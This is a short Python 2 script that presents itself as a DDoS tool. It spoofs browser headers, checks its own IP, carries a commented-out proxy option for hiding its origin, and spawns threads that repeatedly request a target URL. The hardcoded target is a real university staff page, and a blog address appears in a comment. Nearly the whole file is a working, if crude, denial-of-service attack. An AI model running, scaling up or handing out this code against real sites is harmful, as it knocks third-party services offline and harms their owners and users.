import threading as thr
import sys
import urllib2

def put_file(x) :
    f = open("log.html","w")
    f.write(x)
    f.close()

header = {
    "User-Agent":       "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60",
    "Host":             "www.google.com",
    "Connection":       "keep-alive",
    "Cache-Control":    "max-age=0",
    "Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding":  "gzip, deflate, lzma, sdch",
    "Accept-Language":  "en-GB,en-US;q=0.8,en;q=0.6"
}

#print "Set proxy"
#proxy  = urllib2.ProxyHandler({'http':'187.53.61.105:3128'})
#opener = urllib2.build_opener(proxy)
#urllib2.install_opener(opener)

print "Checking IP address :"
print urllib2.urlopen(urllib2.Request('http://my-ip.herokuapp.com/',headers=header)).read()

print "Start DDoS"
def DoS(url,loop=1) :
    for i in range(loop) :
        try:
            urllib2.urlopen(urllib2.Request(url,headers=header))
            sys.stdout.write(".")
        except Exception:
            sys.stdout.write("X")

def DDoS(url,nAgent,nLoop) :
    bots = []
    for i in range(nAgent) :
        x = thr.Thread(target=DoS,args=(url,nLoop))
        bots+=[x]
        x.start()
    for x in bots :
        x.join()
    print "\nDone"
    
#url = "http://tathalo.blogspot.fi/"
url = "http://www.cc.puv.fi/~gc/newhome/index.html"
DDoS(url,1,1)